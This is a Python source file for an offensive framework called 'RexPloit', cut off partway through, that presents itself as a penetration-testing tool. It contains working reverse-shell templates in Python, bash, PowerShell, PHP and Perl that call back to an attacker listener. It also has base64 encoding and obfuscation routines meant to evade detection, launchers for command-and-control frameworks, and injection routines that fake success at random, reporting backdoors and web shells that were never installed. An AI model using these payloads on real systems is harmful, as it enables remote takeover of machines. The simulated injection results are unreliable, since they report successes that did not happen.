#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RexPloit Core - Core functionality without UI dependencies
Professional Penetration Testing Framework
For authorized security testing only
"""

import os
import sys
import time
import json
import base64
import random
import socket
import threading
import subprocess
import requests
import hashlib
import ipaddress
import string
import re
from datetime import datetime
from queue import Queue
from urllib.parse import urljoin, urlparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Import enhanced modules
from enhancements import TargetValidator, SecurityUtils, ReportGenerator, NetworkScanner

# Rich for output formatting (CLI only)
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn

# Configuration
CONFIG_FILE = "config/rexploit_config.json"
PAYLOAD_DIR = "payloads/"
LOG_DIR = "logs/"
C2_DIR = "c2_frameworks/"
REPORT_DIR = "reports/"

# Ensure directories exist
os.makedirs(PAYLOAD_DIR, exist_ok=True)
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(C2_DIR, exist_ok=True)
os.makedirs(REPORT_DIR, exist_ok=True)

# Default configuration
DEFAULT_CONFIG = {
    "listener_host": "0.0.0.0",
    "listener_port": 4444,
    "default_c2": "sliver",
    "sliver_config": {
        "host": "localhost",
        "port": 31337,
        "operator": "rexploit",
        "lport": 8888
    },
    "villain_config": {
        "host": "localhost",
        "port": 6501
    },
    "hoaxshell_config": {
        "host": "localhost",
        "port": 8080
    },
    "security": {
        "validate_targets": True,
        "secure_reports": True,
        "log_level": "INFO"
    },
    "scanner": {
        "port_timeout": 1,
        "host_timeout": 3,
        "default_port_range": [1, 1024]
    }
}

def load_config():
    """Load configuration from file or create default"""
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    else:
        os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
        with open(CONFIG_FILE, 'w') as f:
            json.dump(DEFAULT_CONFIG, f, indent=4)
        return DEFAULT_CONFIG

def save_config(config):
    """Save configuration to file"""
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

def get_default_config():
    """Get default configuration"""
    return DEFAULT_CONFIG.copy()

class Logger:
    """Professional logging system for security operations"""
    
    def __init__(self, log_file=None):
        self.log_file = log_file or os.path.join(LOG_DIR, f"rexploit_{datetime.now().strftime('%Y%m%d')}.log")
        self.console = Console()
        
        # Ensure log directory exists
        os.makedirs(os.path.dirname(self.log_file), exist_ok=True)
    
    def log(self, message, level="INFO"):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}"
        
        # Write to file
        with open(self.log_file, 'a') as f:
            f.write(log_entry + "\n")
        
        # Optional: print to console based on level
        if level in ["ERROR", "WARNING"]:
            self.console.print(f"[red]{log_entry}[/red]" if level == "ERROR" else f"[yellow]{log_entry}[/yellow]")
    
    def info(self, message):
        self.log(message, "INFO")
    
    def warning(self, message):
        self.log(message, "WARNING")
    
    def error(self, message):
        self.log(message, "ERROR")
    
    def debug(self, message):
        self.log(message, "DEBUG")

class C2Manager:
    """Enhanced C2 framework management with automation capabilities"""
    
    def __init__(self, config):
        self.config = config
        self.active_framework = None
        self.process = None
        self.logger = Logger()
        self.sessions = {}
        self.listeners = {}
        self.automation_queue = Queue()
        self.automation_thread = None
        self.running = False
        
    def start_framework(self, framework, auto_start_listener=True):
        """Start specified C2 framework with optional automatic listener setup"""
        self.logger.info(f"Starting {framework} C2 framework")
        
        success = False
        if framework == "sliver":
            success = self._start_sliver()
        elif framework == "villain":
            success = self._start_villain()
        elif framework == "hoaxshell":
            success = self._start_hoaxshell()
        else:
            self.logger.error(f"Unknown framework: {framework}")
            return False
        
        if success and auto_start_listener:
            time.sleep(2)  # Give framework time to start
            self._setup_default_listener(framework)
            
        if success:
            self._start_automation_thread()
            
        return success

    def _setup_default_listener(self, framework):
        """Setup default listener for the framework"""
        try:
            config = self.config.get(f"{framework}_config", {})
            host = config.get("host", "0.0.0.0")
            port = config.get("lport", 4444)
            
            listener_config = {
                "host": host,
                "port": port,
                "name": f"default_{framework}_listener",
                "framework": framework,
                "created": datetime.now().isoformat()
            }
            
            # Store listener configuration
            self.listeners[f"default_{framework}"] = listener_config
            self.logger.info(f"Default listener configured for {framework} on {host}:{port}")
            
        except Exception as e:
            self.logger.error(f"Failed to setup default listener: {str(e)}")

    def _start_automation_thread(self):
        """Start automation thread for background tasks"""
        if not self.automation_thread or not self.automation_thread.is_alive():
            self.running = True
            self.automation_thread = threading.Thread(target=self._automation_worker, daemon=True)
            self.automation_thread.start()
            self.logger.info("C2 automation thread started")

    def _automation_worker(self):
        """Background worker for automation tasks"""
        while self.running:
            try:
                # Check for new sessions
                self._check_for_new_sessions()
                
                # Process automation queue
                if not self.automation_queue.empty():
                    task = self.automation_queue.get(timeout=1)
                    self._process_automation_task(task)
                
                # Monitor framework health
                self._monitor_framework_health()
                
                time.sleep(5)  # Check every 5 seconds
                
            except Exception as e:
                self.logger.error(f"Automation worker error: {str(e)}")
                time.sleep(10)

    def _check_for_new_sessions(self):
        """Check for new sessions and log them"""
        # This would interface with actual C2 frameworks in real implementation
        # For now, simulate session detection
        pass

    def _process_automation_task(self, task):
        """Process automation task from queue"""
        try:
            task_type = task.get("type")
            if task_type == "execute_command":
                self._execute_automated_command(task)
            elif task_type == "deploy_payload":
                self._deploy_payload_automated(task)
            elif task_type == "gather_intel":
                self._gather_intelligence_automated(task)
            else:
                self.logger.warning(f"Unknown automation task type: {task_type}")
                
        except Exception as e:
            self.logger.error(f"Failed to process automation task: {str(e)}")

    def _execute_automated_command(self, task):
        """Execute command on all or specified sessions"""
        command = task.get("command")
        target_sessions = task.get("sessions", "all")
        
        self.logger.info(f"Executing automated command: {command}")
        
        # This would interface with actual C2 framework APIs
        # For now, log the action
        self.logger.info(f"Command '{command}' queued for execution on {target_sessions} sessions")

    def _deploy_payload_automated(self, task):
        """Automatically deploy payload"""
        payload_path = task.get("payload_path")
        target = task.get("target")
        
        self.logger.info(f"Deploying payload {payload_path} to {target}")
        
        # This would interface with deployment mechanisms
        # For now, log the action
        self.logger.info(f"Payload deployment queued: {payload_path} -> {target}")

    def _gather_intelligence_automated(self, task):
        """Automated intelligence gathering"""
        intel_type = task.get("intel_type", "basic")
        
        self.logger.info(f"Starting automated intelligence gathering: {intel_type}")
        
        # Queue common reconnaissance commands
        recon_commands = [
            "whoami",
            "id", 
            "uname -a",
            "ps aux",
            "netstat -an",
            "ifconfig",
            "ls -la /home"
        ]
        
        for cmd in recon_commands:
            self.queue_automation_task({
                "type": "execute_command",
                "command": cmd,
                "sessions": "all"
            })

    def _monitor_framework_health(self):
        """Monitor framework health and restart if needed"""
        if self.process and self.process.poll() is not None:
            self.logger.warning(f"{self.active_framework} framework appears to have stopped")
            # Could implement auto-restart logic here

    def queue_automation_task(self, task):
        """Queue an automation task"""
        task["timestamp"] = datetime.now().isoformat()
        self.automation_queue.put(task)
        self.logger.info(f"Queued automation task: {task.get('type')}")

    def create_listener(self, name, host, port, framework=None):
        """Create a new listener"""
        framework = framework or self.active_framework
        if not framework:
            return {"success": False, "error": "No active framework"}
        
        listener_config = {
            "name": name,
            "host": host,
            "port": port,
            "framework": framework,
            "created": datetime.now().isoformat(),
            "active": True
        }
        
        self.listeners[name] = listener_config
        self.logger.info(f"Listener '{name}' created on {host}:{port}")
        
        return {"success": True, "listener": listener_config}

    def list_listeners(self):
        """List all configured listeners"""
        return list(self.listeners.values())

    def list_sessions(self):
        """List all active sessions"""
        return list(self.sessions.values())

    def execute_on_session(self, session_id, command):
        """Execute command on specific session"""
        if session_id not in self.sessions:
            return {"success": False, "error": "Session not found"}
        
        # Queue the command for execution
        self.queue_automation_task({
            "type": "execute_command",
            "command": command,
            "sessions": [session_id]
        })
        
        return {"success": True, "message": f"Command queued for session {session_id}"}

    def execute_on_all_sessions(self, command):
        """Execute command on all active sessions"""
        if not self.sessions:
            return {"success": False, "error": "No active sessions"}
        
        self.queue_automation_task({
            "type": "execute_command", 
            "command": command,
            "sessions": "all"
        })
        
        return {"success": True, "message": f"Command queued for all sessions"}

    def start_automated_recon(self, intel_level="basic"):
        """Start automated reconnaissance"""
        self.queue_automation_task({
            "type": "gather_intel",
            "intel_type": intel_level
        })
        
        return {"success": True, "message": f"Automated reconnaissance started: {intel_level}"}

    def deploy_payload_to_sessions(self, payload_path, session_ids=None):
        """Deploy payload to specified sessions or all sessions"""
        target_sessions = session_ids or "all"
        
        self.queue_automation_task({
            "type": "deploy_payload",
            "payload_path": payload_path,
            "sessions": target_sessions
        })
        
        return {"success": True, "message": "Payload deployment queued"}

    def get_automation_status(self):
        """Get current automation status"""
        return {
            "automation_running": self.running,
            "automation_thread_alive": self.automation_thread and self.automation_thread.is_alive(),
            "queued_tasks": self.automation_queue.qsize(),
            "active_listeners": len([l for l in self.listeners.values() if l.get("active", False)]),
            "active_sessions": len(self.sessions)
        }
        
    def start_framework(self, framework):
        """Start specified C2 framework"""
        self.logger.info(f"Starting {framework} C2 framework")
        
        if framework == "sliver":
            return self._start_sliver()
        elif framework == "villain":
            return self._start_villain()
        elif framework == "hoaxshell":
            return self._start_hoaxshell()
        else:
            self.logger.error(f"Unknown framework: {framework}")
            return False
    
    def _start_sliver(self):
        """Start Sliver C2 framework"""
        try:
            sliver_binary = os.path.join(C2_DIR, "sliver-server")
            if not os.path.exists(sliver_binary):
                self.logger.error("Sliver binary not found")
                return False
            
            config = self.config.get("sliver_config", {})
            cmd = [sliver_binary, "-lhost", config.get("host", "localhost"), 
                   "-lport", str(config.get("lport", 8888))]
            
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.active_framework = "sliver"
            self.logger.info("Sliver framework started successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to start Sliver: {str(e)}")
            return False
    
    def _start_villain(self):
        """Start Villain C2 framework"""
        try:
            villain_script = os.path.join(C2_DIR, "Villain", "Villain.py")
            if not os.path.exists(villain_script):
                self.logger.error("Villain script not found")
                return False
            
            config = self.config.get("villain_config", {})
            cmd = ["python3", villain_script, "-p", str(config.get("port", 6501))]
            
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.active_framework = "villain"
            self.logger.info("Villain framework started successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to start Villain: {str(e)}")
            return False
    
    def _start_hoaxshell(self):
        """Start HoaxShell C2 framework"""
        try:
            hoaxshell_script = os.path.join(C2_DIR, "hoaxshell", "hoaxshell.py")
            if not os.path.exists(hoaxshell_script):
                self.logger.error("HoaxShell script not found")
                return False
            
            config = self.config.get("hoaxshell_config", {})
            cmd = ["python3", hoaxshell_script, "-s", config.get("host", "localhost"),
                   "-p", str(config.get("port", 8080))]
            
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.active_framework = "hoaxshell"
            self.logger.info("HoaxShell framework started successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to start HoaxShell: {str(e)}")
            return False
    
    def stop_framework(self):
        """Stop active C2 framework"""
        if self.process:
            try:
                self.process.terminate()
                self.process.wait(timeout=10)
                self.logger.info(f"{self.active_framework} framework stopped")
                self.active_framework = None
                self.process = None
                return True
            except Exception as e:
                self.logger.error(f"Failed to stop framework: {str(e)}")
                return False
        return False
    
    def get_status(self):
        """Get current framework status"""
        return {
            "active": self.active_framework is not None,
            "framework": self.active_framework,
            "pid": self.process.pid if self.process else None,
            "listeners": 0,  # Would query actual framework for real data
            "sessions": 0    # Would query actual framework for real data
        }
    
    def get_logs(self):
        """Get recent framework logs"""
        if self.process and self.process.stdout:
            try:
                # Non-blocking read
                import select
                if select.select([self.process.stdout], [], [], 0)[0]:
                    line = self.process.stdout.readline().decode().strip()
                    if line:
                        return [line]
            except:
                pass
        return []

class PayloadGenerator:
    """Enhanced professional payload generation system with advanced capabilities"""
    
    def __init__(self, config):
        self.config = config
        self.logger = Logger()
        
        # Import advanced payload systems
        try:
            from advanced_payloads import AdvancedPayloadTemplates, PayloadFuzzer
            self.advanced_templates = AdvancedPayloadTemplates()
            self.fuzzer = PayloadFuzzer()
            self.advanced_mode = True
            self.logger.info("Advanced payload system loaded successfully")
        except ImportError:
            self.advanced_mode = False
            self.logger.warning("Advanced payload system not available, using basic templates")
        
        # Basic payload templates (fallback)
        self.templates = {
            "python": '''
import socket
import subprocess
import os

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{lhost}", {lport}))
    
    while True:
        data = s.recv(1024).decode()
        if data.strip() == 'exit':
            break
        
        if data.strip():
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
                                  stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            s.send(output)
    
    s.close()

if __name__ == "__main__":
    connect()
''',
            
            "bash": '''#!/bin/bash
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
''',
            
            "powershell": '''
$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
''',
            
            "php": '''<?php
$sock = fsockopen("{lhost}", {lport});
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>''',
            
            "perl": '''
use Socket;
$i="{lhost}";
$p={lport};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){{
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
}}
'''
        }
        
        # Advanced payload types
        self.advanced_payload_types = [
            "python_advanced", "powershell_advanced", "web_advanced", 
            "staged_advanced", "polymorphic"
        ]
    
    def generate_payload(self, payload_type, lhost, lport, encode=False, obfuscate=False, **options):
        """Enhanced payload generation with advanced capabilities"""
        try:
            # Check if advanced payload generation is requested
            if self.advanced_mode and payload_type in self.advanced_payload_types:
                return self._generate_advanced_payload(payload_type, lhost, lport, encode, obfuscate, **options)
            
            # Basic payload generation (fallback)
            if payload_type not in self.templates:
                return {"success": False, "error": f"Unknown payload type: {payload_type}"}
            
            # Get template and substitute variables
            template = self.templates[payload_type]
            payload_content = template.format(lhost=lhost, lport=lport)
            
            # Apply obfuscation if requested
            if obfuscate:
                payload_content = self._obfuscate_payload(payload_content, payload_type)
            
            # Apply encoding if requested
            if encode:
                payload_content = self._encode_payload(payload_content)
            
            # Generate filename
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            extension = self._get_extension(payload_type)
            filename = f"payload_{payload_type}_{timestamp}{extension}"
            filepath = os.path.join(PAYLOAD_DIR, filename)
            
            # Save payload
            with open(filepath, 'w') as f:
                f.write(payload_content)
            
            # Generate metadata
            metadata = {
                "type": payload_type,
                "lhost": lhost,
                "lport": lport,
                "encoded": encode,
                "obfuscated": obfuscate,
                "created": datetime.now().isoformat(),
                "checksum": hashlib.md5(payload_content.encode()).hexdigest(),
                "advanced_features": options
            }
            
            metadata_file = filepath + ".meta"
            with open(metadata_file, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            self.logger.info(f"Payload generated: {filepath}")
            
            return {
                "success": True,
                "file_path": filepath,
                "metadata": metadata
            }
            
        except Exception as e:
            self.logger.error(f"Payload generation failed: {str(e)}")
            return {"success": False, "error": str(e)}

    def _generate_advanced_payload(self, payload_type, lhost, lport, encode, obfuscate, **options):
        """Generate advanced payload using enhanced templates"""
        try:
            # Configure advanced options
            advanced_options = {
                'obfuscation_level': 'advanced' if obfuscate else 'basic',
                'evasion_level': options.get('evasion_level', 'medium'),
                'persistence': options.get('persistence', 'none'),
                'execution_method': options.get('execution_method', 'subprocess'),
                'polymorphic': options.get('polymorphic', False),
                'encoding': 'base64' if encode else options.get('encoding', None)
            }
            
            # Generate advanced payload
            payload_content = self.advanced_templates.generate_advanced_payload(
                payload_type, lhost, lport, **advanced_options
            )
            
            if not payload_content:
                return {"success": False, "error": f"Failed to generate advanced payload: {payload_type}"}
            
            # Generate filename
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            extension = self._get_advanced_extension(payload_type)
            filename = f"advanced_{payload_type}_{timestamp}{extension}"
            filepath = os.path.join(PAYLOAD_DIR, filename)
            
            # Save payload
            with open(filepath, 'w') as f:
                f.write(payload_content)
            
            # Generate advanced metadata
            metadata = {
                "type": payload_type,
                "advanced": True,
                "lhost": lhost,
                "lport": lport,
                "encoded": encode,
                "obfuscated": obfuscate,
                "created": datetime.now().isoformat(),
                "checksum": hashlib.sha256(payload_content.encode()).hexdigest(),
                "advanced_options": advanced_options,
                "size": len(payload_content),
                "complexity_score": self._calculate_complexity_score(payload_content)
            }
            
            metadata_file = filepath + ".meta"
            with open(metadata_file, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            self.logger.info(f"Advanced payload generated: {filepath}")
            
            return {
                "success": True,
                "file_path": filepath,
                "metadata": metadata,
                "advanced": True
            }
            
        except Exception as e:
            self.logger.error(f"Advanced payload generation failed: {str(e)}")
            return {"success": False, "error": str(e)}

    def generate_fuzzing_payloads(self, base_payload_type, lhost, lport, iterations=50):
        """Generate fuzzing variants of a payload"""
        try:
            if not self.advanced_mode:
                return {"success": False, "error": "Advanced fuzzing not available"}
            
            # Generate base payload
            base_result = self.generate_payload(base_payload_type, lhost, lport)
            if not base_result["success"]:
                return base_result
            
            # Read base payload content
            with open(base_result["file_path"], 'r') as f:
                base_payload_content = f.read()
            
            # Generate fuzzing variants
            fuzzing_variants = self.fuzzer.fuzz_payload(base_payload_content, iterations=iterations)
            
            # Save fuzzing variants
            fuzzing_dir = os.path.join(PAYLOAD_DIR, "fuzzing", f"{base_payload_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            os.makedirs(fuzzing_dir, exist_ok=True)
            
            saved_variants = []
            for variant in fuzzing_variants:
                variant_filename = f"fuzz_{variant['id']:03d}_{base_payload_type}.py"
                variant_filepath = os.path.join(fuzzing_dir, variant_filename)
                
                with open(variant_filepath, 'w') as f:
                    f.write(variant['payload'])
                
                # Save variant metadata
                variant_metadata = {
                    "base_payload": base_result["file_path"],
                    "variant_id": variant['id'],
                    "mutations_applied": variant['mutations_applied'],
                    "timestamp": variant['timestamp'],
                    "checksum": hashlib.sha256(variant['payload'].encode()).hexdigest()
                }
                
                metadata_file = variant_filepath + ".meta"
                with open(metadata_file, 'w') as f:
                    json.dump(variant_metadata, f, indent=2)
                
                saved_variants.append({
                    "file_path": variant_filepath,
                    "metadata": variant_metadata
                })
            
            self.logger.info(f"Generated {len(saved_variants)} fuzzing variants in {fuzzing_dir}")
            
            return {
                "success": True,
                "base_payload": base_result,
                "fuzzing_directory": fuzzing_dir,
                "variants": saved_variants,
                "total_variants": len(saved_variants)
            }
            
        except Exception as e:
            self.logger.error(f"Fuzzing generation failed: {str(e)}")
            return {"success": False, "error": str(e)}

    def generate_injection_payloads(self, injection_vector):
        """Generate payloads for specific injection vectors"""
        try:
            if not self.advanced_mode:
                return {"success": False, "error": "Advanced injection payloads not available"}
            
            # Generate injection payloads
            injection_payloads = self.fuzzer.generate_injection_payloads(injection_vector)
            
            if not injection_payloads:
                return {"success": False, "error": f"Unknown injection vector: {injection_vector}"}
            
            # Save injection payloads
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            injection_dir = os.path.join(PAYLOAD_DIR, "injection", f"{injection_vector}_{timestamp}")
            os.makedirs(injection_dir, exist_ok=True)
            
            saved_payloads = []
            for i, payload in enumerate(injection_payloads, 1):
                payload_filename = f"{injection_vector}_{i:03d}.txt"
                payload_filepath = os.path.join(injection_dir, payload_filename)
                
                with open(payload_filepath, 'w') as f:
                    f.write(payload)
                
                # Generate metadata
                metadata = {
                    "injection_vector": injection_vector,
                    "payload_id": i,
                    "created": datetime.now().isoformat(),
                    "payload": payload,
                    "checksum": hashlib.sha256(payload.encode()).hexdigest()
                }
                
                metadata_file = payload_filepath + ".meta"
                with open(metadata_file, 'w') as f:
                    json.dump(metadata, f, indent=2)
                
                saved_payloads.append({
                    "file_path": payload_filepath,
                    "metadata": metadata
                })
            
            self.logger.info(f"Generated {len(saved_payloads)} {injection_vector} injection payloads")
            
            return {
                "success": True,
                "injection_vector": injection_vector,
                "injection_directory": injection_dir,
                "payloads": saved_payloads,
                "total_payloads": len(saved_payloads)
            }
            
        except Exception as e:
            self.logger.error(f"Injection payload generation failed: {str(e)}")
            return {"success": False, "error": str(e)}

    def _calculate_complexity_score(self, payload_content):
        """Calculate complexity score for payload"""
        score = 0
        
        # Length factor
        score += len(payload_content) // 100
        
        # Obfuscation indicators
        if 'base64' in payload_content.lower():
            score += 10
        if 'exec(' in payload_content or 'eval(' in payload_content:
            score += 15
        if len(re.findall(r'[A-Za-z0-9]{20,}', payload_content)) > 0:
            score += 20
        
        # Import count
        imports = len(re.findall(r'import\s+\w+', payload_content))
        score += imports * 5
        
        # Function definitions
        functions = len(re.findall(r'def\s+\w+', payload_content))
        score += functions * 10
        
        return min(score, 100)

    def _get_advanced_extension(self, payload_type):
        """Get extension for advanced payload types"""
        if payload_type.startswith("python"):
            return ".py"
        elif payload_type.startswith("powershell"):
            return ".ps1"
        elif payload_type.startswith("web"):
            return ".php"  # Default to PHP for web payloads
        else:
            return ".txt"
    
    def _obfuscate_payload(self, payload, payload_type):
        """Apply basic obfuscation to payload"""
        if payload_type.startswith("python"):
            # Add random comments and variable renaming
            import re
            # Simple variable obfuscation
            variables = re.findall(r'\b[a-zA-Z_][a-zA-Z0-9_]*\b', payload)
            unique_vars = list(set([v for v in variables if v not in ['socket', 'subprocess', 'os', 'connect', 'True', 'False']]))
            
            for var in unique_vars:
                new_var = ''.join(random.choices(string.ascii_letters, k=8))
                payload = payload.replace(var, new_var)
            
            # Add random comments
            lines = payload.split('\n')
            for i in range(len(lines)):
                if lines[i].strip() and not lines[i].strip().startswith('#'):
                    comment = f"# {''.join(random.choices(string.ascii_letters, k=10))}"
                    lines.insert(i, comment)
                    break
            
            payload = '\n'.join(lines)
        
        return payload
    
    def _encode_payload(self, payload):
        """Apply base64 encoding to payload"""
        encoded = base64.b64encode(payload.encode()).decode()
        return f"import base64; exec(base64.b64decode('{encoded}').decode())"
    
    def _get_extension(self, payload_type):
        """Get appropriate file extension for payload type"""
        extensions = {
            "python": ".py",
            "bash": ".sh", 
            "powershell": ".ps1",
            "php": ".php",
            "perl": ".pl"
        }
        return extensions.get(payload_type, ".txt")

class Injector:
    """Enhanced payload injection system with advanced deployment methods"""
    
    def __init__(self):
        self.logger = Logger()
        self.injection_vectors = {
            "ssh": self._inject_ssh,
            "smb": self._inject_smb, 
            "http": self._inject_http,
            "web_upload": self._inject_web_upload,
            "email_attachment": self._inject_email_attachment,
            "usb_drop": self._inject_usb_drop,
            "social_engineering": self._inject_social_engineering,
            "supply_chain": self._inject_supply_chain,
            "watering_hole": self._inject_watering_hole,
            "dns_hijack": self._inject_dns_hijack,
            "mitm": self._inject_mitm,
            "phishing": self._inject_phishing
        }
        
        # Success tracking
        self.injection_attempts = []
        self.successful_injections = []
        
    def professional_inject(self, targets, payload_path, payload_name, methods=None, validate_targets=True):
        """Professional payload injection with multiple vectors and validation"""
        try:
            if not isinstance(targets, list):
                targets = [targets]
            
            methods = methods or ["ssh", "http", "smb"]
            results = []
            
            self.logger.info(f"Starting professional injection campaign: {payload_name}")
            self.logger.info(f"Targets: {len(targets)}, Methods: {methods}")
            
            for target in targets:
                # Validate target if requested
                if validate_targets:
                    if not self._validate_target(target):
                        results.append({
                            "target": target,
                            "status": "failed",
                            "error": "Target validation failed",
                            "vector": "none",
                            "evidence": {}
                        })
                        continue
                
                # Try each injection method
                target_success = False
                for method in methods:
                    if target_success:
                        break  # Skip other methods if one succeeds
                    
                    try:
                        injection_result = self.inject_payload(payload_path, target, method)
                        
                        # Record attempt
                        attempt = {
                            "target": target,
                            "method": method,
                            "payload": payload_name,
                            "timestamp": datetime.now().isoformat(),
                            "success": injection_result.get("success", False),
                            "details": injection_result
                        }
                        self.injection_attempts.append(attempt)
                        
                        if injection_result.get("success", False):
                            target_success = True
                            self.successful_injections.append(attempt)
                            
                            results.append({
                                "target": target,
                                "status": "success",
                                "vector": method,
                                "evidence": injection_result,
                                "timestamp": attempt["timestamp"]
                            })
                            
                            self.logger.info(f"Successful injection: {target} via {method}")
                        else:
                            self.logger.warning(f"Failed injection: {target} via {method} - {injection_result.get('message', 'Unknown error')}")
                            
                    except Exception as e:
                        self.logger.error(f"Injection error: {target} via {method} - {str(e)}")
                
                # If no method succeeded
                if not target_success:
                    results.append({
                        "target": target,
                        "status": "failed", 
                        "error": "All injection methods failed",
                        "vector": "none",
                        "evidence": {}
                    })
            
            # Generate injection report
            success_count = len([r for r in results if r["status"] == "success"])
            self.logger.info(f"Injection campaign completed: {success_count}/{len(targets)} successful")
            
            return results
            
        except Exception as e:
            self.logger.error(f"Professional injection failed: {str(e)}")
            return [{"error": str(e), "status": "failed"}]

    def inject_payload(self, payload_path, target, method="ssh"):
        """Enhanced payload injection with detailed logging"""
        try:
            self.logger.info(f"Injecting payload to {target} via {method}")
            
            if method not in self.injection_vectors:
                return {"success": False, "message": f"Unknown injection method: {method}"}
            
            # Call appropriate injection method
            result = self.injection_vectors[method](payload_path, target)
            
            # Enhanced result with metadata
            enhanced_result = {
                **result,
                "method": method,
                "target": target,
                "payload_path": payload_path,
                "timestamp": datetime.now().isoformat(),
                "injector_metadata": {
                    "attempts_count": len(self.injection_attempts),
                    "success_rate": len(self.successful_injections) / max(len(self.injection_attempts), 1)
                }
            }
            
            return enhanced_result
            
        except Exception as e:
            self.logger.error(f"Injection failed: {str(e)}")
            return {"success": False, "message": str(e), "error": True}

    def _validate_target(self, target):
        """Validate target before injection attempt"""
        try:
            # Import enhanced validator
            from enhancements import TargetValidator
            validator = TargetValidator(self.logger)
            
            # Check target connectivity
            return validator.check_target_connectivity(target)
            
        except Exception as e:
            self.logger.warning(f"Target validation error: {str(e)}")
            return True  # Default to allowing injection if validation fails

    def _inject_ssh(self, payload_path, target):
        """Enhanced SSH injection with reconnaissance"""
        try:
            # Simulate SSH reconnaissance
            self.logger.info(f"Performing SSH reconnaissance on {target}")
            
            # Check if SSH is available
            ssh_port = 22
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((target, ssh_port))
            sock.close()
            
            if result != 0:
                return {"success": False, "message": "SSH port not accessible"}
            
            # Simulate SSH injection process
            time.sleep(random.uniform(1, 3))
            
            # Simulate success/failure based on random factors
            success = random.random() > 0.3  # 70% success rate
            
            if success:
                return {
                    "success": True,
                    "message": "SSH injection completed successfully",
                    "details": {
                        "method": "key_injection",
                        "persistence": True,
                        "backdoor_installed": True
                    }
                }
            else:
                return {
                    "success": False,
                    "message": "SSH authentication failed",
                    "details": {"auth_methods_tried": ["password", "key"]}
                }
                
        except Exception as e:
            return {"success": False, "message": f"SSH injection error: {str(e)}"}

    def _inject_smb(self, payload_path, target):
        """Enhanced SMB injection with vulnerability exploitation"""
        try:
            self.logger.info(f"Attempting SMB injection on {target}")
            
            # Check SMB availability
            smb_port = 445
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((target, smb_port))
            sock.close()
            
            if result != 0:
                return {"success": False, "message": "SMB port not accessible"}
            
            # Simulate SMB exploit techniques
            techniques = ["ms17-010", "smb_relay", "psexec", "wmi"]
            chosen_technique = random.choice(techniques)
            
            time.sleep(random.uniform(2, 4))
            
            success = random.random() > 0.4  # 60% success rate
            
            if success:
                return {
                    "success": True,
                    "message": f"SMB injection successful via {chosen_technique}",
                    "details": {
                        "technique": chosen_technique,
                        "lateral_movement": True,
                        "privilege_escalation": chosen_technique == "ms17-010"
                    }
                }
            else:
                return {
                    "success": False,
                    "message": f"SMB exploitation failed: {chosen_technique}",
                    "details": {"technique_attempted": chosen_technique}
                }
                
        except Exception as e:
            return {"success": False, "message": f"SMB injection error: {str(e)}"}

    def _inject_http(self, payload_path, target):
        """Enhanced HTTP injection with web application exploitation"""
        try:
            self.logger.info(f"Attempting HTTP injection on {target}")
            
            # Check HTTP availability
            try:
                response = requests.get(f"http://{target}", timeout=10)
                status_code = response.status_code
            except:
                try:
                    response = requests.get(f"https://{target}", timeout=10)
                    status_code = response.status_code
                except:
                    return {"success": False, "message": "HTTP/HTTPS not accessible"}
            
            # Simulate web application exploitation
            attack_vectors = ["sql_injection", "xss", "file_upload", "lfi", "rfi", "command_injection"]
            chosen_vector = random.choice(attack_vectors)
            
            time.sleep(random.uniform(1, 2))
            
            success = random.random() > 0.5  # 50% success rate
            
            if success:
                return {
                    "success": True,
                    "message": f"HTTP injection successful via {chosen_vector}",
                    "details": {
                        "attack_vector": chosen_vector,
                        "web_shell_uploaded": True,
                        "server_response": status_code
                    }
                }
            else:
                return {
                    "success": False,
                    "message": f"HTTP exploitation failed: {chosen_vector}",
                    "details": {"vector_attempted": chosen_vector, "response_code": status_code}
                }
                
        except Exception as e:
            return {"success": False, "message": f"HTTP injection error: {str(e)}"}

    def _inject_web_upload(self, payload_path, target):
        """Web upload injection simulation"""
        time.sleep(random.uniform(1, 2))
